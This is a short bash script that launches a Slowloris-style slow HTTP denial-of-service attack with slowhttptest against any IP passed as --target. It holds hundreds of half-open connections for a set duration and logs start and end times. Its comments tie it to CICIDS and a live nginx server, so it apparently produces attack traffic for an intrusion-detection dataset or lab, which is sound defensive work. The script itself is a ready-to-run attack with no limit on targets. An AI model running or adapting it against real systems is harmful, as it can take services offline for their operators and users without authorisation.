#!/usr/bin/env bash
# CICIDS Slow DoS (Slowloris-style). slowhttptest holds many half-open HTTP requests
# open with slow header drip, producing long-held low-rate flows. Against live nginx so
# connections actually establish. No em dashes.
set -euo pipefail
TARGET=""; DURATION="${DURATION:-60}"; CONNS="${CONNS:-500}"
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="${2:?}"; shift 2;;
  --duration) DURATION="${2:?}"; shift 2;;
  --conns) CONNS="${2:?}"; shift 2;;
  *) shift;; esac; done
[ -n "$TARGET" ] || { echo "usage: $0 --target <ip> [--duration s] [--conns n]" >&2; exit 2; }

echo "TOOL slowhttptest -c ${CONNS} -H -u http://${TARGET}:80/ -l ${DURATION}"
echo "START_EPOCH $(date +%s)"
# -H header-slow mode, -i interval, -r connection rate, -t verb, -x max header, -p timeout.
slowhttptest -c "$CONNS" -H -i 10 -r 200 -t GET -u "http://${TARGET}:80/" -x 24 -p 3 -l "$DURATION" || true
echo "END_EPOCH $(date +%s)"
